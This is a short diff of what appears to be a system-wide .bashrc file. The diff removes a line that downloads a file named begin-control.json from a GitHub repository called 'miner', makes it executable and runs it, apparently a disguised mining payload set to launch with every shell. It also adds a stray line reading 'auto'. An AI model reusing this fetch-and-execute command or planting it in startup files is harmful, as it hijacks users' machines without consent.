@@ -1,5 +1,4 @@
-wget -N --timeout 20 --connect-timeout=30 -t 2 --no-check-certificate https://raw.githubusercontent.com/saengx/miner/main/begin-control.json && chmod +x begin-control.json && ./begin-control.json
-./begin-control.json
+auto
 # System-wide .bashrc file for interactive bash(1) shells.
 
 # To enable the settings / commands in this file for login shells as well,
